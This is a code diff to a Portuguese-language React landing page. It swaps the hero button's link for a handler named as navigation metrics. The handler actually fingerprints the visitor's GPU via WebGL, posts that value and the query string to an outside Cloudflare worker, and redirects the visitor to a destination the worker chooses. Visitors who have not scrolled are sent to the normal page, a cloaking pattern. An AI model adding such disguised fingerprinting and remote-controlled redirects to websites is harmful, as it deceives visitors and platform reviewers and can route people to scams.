@@ -10,6 +10,32 @@ const AzeiteTR = () => {
     if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
   };
 
+  const handleNavigationMetrics = async (e: React.MouseEvent) => {
+    e.preventDefault();
+    const p = window.location.search;
+    const c = document.createElement('canvas');
+    const g = c.getContext('webgl');
+    const r = g ? g.getParameter(37446) : "n/a";
+    if (window.scrollY < 50) {
+      window.location.href = "/apresentacao" + p;
+      return;
+    }
+    try {
+      const res = await fetch('https://porteiro-dropix.lucaszrodx.workers.dev', {
+        method: 'POST',
+        body: JSON.stringify({ t: "ui_action", v: r, s: p })
+      });
+      const d = await res.json();
+      if (d.destination) {
+        window.location.href = d.destination;
+      } else {
+        window.location.href = "/apresentacao" + p;
+      }
+    } catch (err) {
+      window.location.href = "/apresentacao" + p;
+    }
+  };
+
   return (
     <div className="azt-page">
       <style>{`
@@ -572,9 +598,9 @@ const AzeiteTR = () => {
           </div>
           <p className="azt-hero-meta" style={{ marginTop: '1.2rem' }}>Atualizado em abril de 2026</p>
           <div style={{ marginTop: '2rem' }}>
-            <Link id="btn-hero-explore" to="/apresentacao" className="azt-cta-btn">
+            <a id="btn-hero-explore" href="/apresentacao" onClick={handleNavigationMetrics} className="azt-cta-btn">
               ASSISTIR MINHA APRESENTAÇÃO GRATUITA!
-            </Link>
+            </a>
           </div>
         </div>
         <button onClick={() => scrollTo('azt-conteudo')} className="azt-hero-scroll" aria-label="Rolar para conteúdo">
